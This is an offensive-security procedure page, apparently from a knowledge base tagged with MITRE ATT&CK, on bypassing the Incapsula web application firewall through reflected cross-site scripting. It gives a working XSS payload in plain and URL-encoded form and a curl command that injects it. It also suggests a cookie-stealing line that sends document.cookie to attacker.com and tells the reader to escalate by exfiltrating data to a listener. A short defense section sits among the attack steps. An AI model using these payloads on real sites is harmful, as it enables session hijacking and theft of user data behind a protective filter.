---
id: f71fd21a-1581-4f29-a23e-669af0fa55a7
name: Incapsula-WAF-Bypass-via-XSS-Attack
type: procedure
verified: true
submitted: false
created_at: '2023-04-06T03:56:43.480594+00:00'
updated_at: '2023-04-10T20:21:53.368069+00:00'
tactics:
  - '[[tactics/Defense-Evasion|TA0005 - Defense Evasion]]'
  - '[[tactics/Initial-Access|TA0001 - Initial Access]]'
  - '[[tactics/Lateral-Movement|TA0008 - Lateral Movement]]'
techniques:
  - >-
    [[techniques/Exploit-Public-Facing-Application|T1190 - Exploit Public-Facing
    Application]]
  - '[[techniques/Command-and-Scripting-Interpreter|T1059.007 - JavaScript]]'
sub_techniques: []
tags:
  - '[[tags/Common-WAF-Bypass]]'
  - '[[tags/Cross-Site-Scripting]]'
  - '[[tags/Incapsula-WAF-Bypass]]'
commands:
  - '[[commands/curl-inject-xss-payload]]'
platforms:
  - Web
tools:
  - '[[tools/Burp-Suite]]'
validated: true
---

# Incapsula-WAF-Bypass-via-XSS-Attack

## Summary

This procedure demonstrates how to bypass the Incapsula Web Application Firewall (WAF) by exploiting a reflected Cross-Site Scripting (XSS) vulnerability in a public-facing web application. By injecting a specially crafted JavaScript payload that evades Incapsula's filtering rules, attackers can execute arbitrary code in the victim's browser, potentially leading to session hijacking, data theft, or further compromise of the application.

## Description

Incapsula WAF is designed to protect web applications from common attacks like XSS by inspecting and blocking malicious payloads. However, certain obfuscation techniques can bypass its signature-based detection. This procedure targets applications behind Incapsula where an XSS vulnerability exists in a user-controlled input parameter (e.g., a search field or URL query). The attack involves crafting a payload that closes an existing script tag prematurely and injects a new one, using alphanumeric characters and encoding to avoid WAF triggers. Once executed, the payload can alert the domain (for testing) or perform malicious actions like stealing cookies. This technique is particularly effective against misconfigured WAF rules and relies on the application's failure to properly sanitize inputs. The target environment is typically a web application hosted on a domain protected by Incapsula, accessible via HTTP/HTTPS.

## Requirements

1. Network access to the target web application (public-facing URL).
2. Identification of a reflected XSS vulnerability in a parameter (e.g., via manual testing or scanning tools like [[tools/Burp-Suite]]).
3. Knowledge of the application's structure, such as where user input is reflected without sanitization.
4. A proxy tool like [[tools/Burp-Suite]] for intercepting and modifying requests (optional but recommended for precise payload delivery).

## Defense

Defensive measures and detection strategies:

- Regularly scan for and patch XSS vulnerabilities using tools like OWASP ZAP or Burp Suite.
- Implement strict input validation, output encoding (e.g., HTML entity encoding), and Content Security Policy (CSP) to prevent XSS execution.
- Configure Incapsula WAF with custom rules to detect obfuscated payloads, including alphanumeric injections and script tag manipulations.
- Monitor web server logs for suspicious patterns like unusual script injections or alert() executions in JavaScript errors.
- Enable browser-based protections like XSS auditors in modern browsers and educate users on phishing risks.

## Objectives

1. Bypass Incapsula WAF filtering to inject and execute malicious JavaScript.
2. Verify payload execution through a domain alert or cookie theft.
3. Enable further attacks such as session hijacking or data exfiltration from the compromised application.

## Instructions

### Step 1: Identify the XSS-Vulnerable Parameter

**Context**: Locate a reflected XSS entry point in the target application, such as a search parameter (?q= or ?c1=) where input is echoed back without proper escaping. Use manual testing or a scanner to confirm the vulnerability.

**Instructions**: Navigate to the target URL and append a test string like <script>alert(1)</script> to the suspected parameter. If it executes, proceed; otherwise, try variations to find the reflection point.

> This step ensures the application is vulnerable before attempting the bypass. Expected: The test payload triggers a JavaScript alert if unfiltered.

### Step 2: Craft the Bypass Payload

**Context**: Create an obfuscated payload that evades Incapsula's detection by using a non-malicious prefix/suffix and closing/reopening script tags with alphanumeric junk to break signatures.

**Code** ([[codes/XSS-Payload-to-Bypass-Incapsula-WAF]]):

Use the following payload in the vulnerable parameter:

```javascript
anythinglr00</script><script>alert(document.domain)</script>uxldz
```

Or its URL-encoded version for GET requests:

```javascript
anythinglr00%3c%2fscript%3e%3cscript%3ealert(document.domain)%3c%2fscript%3euxldz
```

> The prefix "anythinglr00" and suffix "uxldz" act as junk to confuse WAF patterns, while </script><script> closes any existing tag and starts a new one. The alert(document.domain) confirms execution by displaying the target's domain. Replace alert with malicious code (e.g., document.location='http://attacker.com/steal?cookie='+document.cookie) for real attacks.

### Step 3: Inject and Execute the Payload

**Context**: Deliver the crafted payload to the vulnerable endpoint, bypassing the WAF by sending it in a request that mimics legitimate traffic.

**Command** ([[commands/curl-inject-xss-payload]]):

```bash
curl -X GET "https://target.com/vulnerable-page?c1=anythinglr00%3c%2fscript%3e%3cscript%3ealert(document.domain)%3c%2fscript%3euxldz" -v
```

> This sends the URL-encoded payload via curl for testing. Observe the response for reflection. For browser execution, visit the URL directly or use a proxy like [[tools/Burp-Suite]] to modify requests. If using POST, adjust to -d "c1=payload".

### Step 4: Verify Execution and Escalate

**Context**: Confirm the bypass by checking for payload execution, then leverage it for further actions like stealing sensitive data.

**Instructions**: Load the injected URL in a browser. If successful, an alert box shows the domain. To escalate, modify the payload to exfiltrate data (e.g., send cookies to an attacker-controlled server) and monitor your listener.

> Success is indicated by the alert firing without WAF blocking. If blocked, iterate on payload variations (e.g., add more junk characters).
